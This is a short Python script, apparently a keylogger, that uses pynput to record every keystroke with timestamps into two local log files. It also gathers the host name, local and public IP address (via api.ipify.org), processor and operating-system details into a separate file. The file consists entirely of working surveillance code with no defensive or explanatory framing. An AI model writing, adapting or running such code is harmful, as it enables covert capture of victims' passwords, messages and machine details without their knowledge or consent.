import pynput
import datetime
import threading
import socket
import platform
import requests
from requests import get 
from pynput.keyboard import Key, Listener


def on_press(key):
	keys = []
	keys.append(key)
	current_date_time = datetime.datetime.now()
	write_readable_file(keys, current_date_time)
	write_log_file(keys, current_date_time)
	keys  = []


def write_log_file(keys, current_date_time):
	with open("log.text", "a") as file:
		for key in keys:
			file.write(str(key))
			file.write(str(current_date_time))
			file.write("\n")

def write_readable_file(keys, date_time):
	with open("keys.text", "a") as file:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				file.write(" ")
				file.write(str(date_time))
				file.write('\n')
			elif k.find("Key") == -1:
				file.write(k)

def write_machine_info_file():
	with open("mach_info.text", "a") as file:
		file.write("Host name: %s" %socket.gethostname())
		file.write("\n")
		file.write("IP address: %s" %socket.gethostbyname(socket.gethostname()))
		file.write("\n")
		file.write("Processor type: %s" %platform.processor())
		file.write("\n")
		file.write("System type: %s" %platform.system())
		file.write("\n")
		file.write("Machine type: %s" %platform.machine())
		file.write("\n")
		file.write("Machine version: %s" %platform.version())
		file.write("\n")
		file.write("public IP: %s" %get('https://api.ipify.org').text)
		
def main():
	machine_info = threading.Thread(target=write_machine_info_file)
	machine_info.start()
	with Listener(on_press=on_press) as listener:
		listener.join()

if __name__ == '__main__':
	main()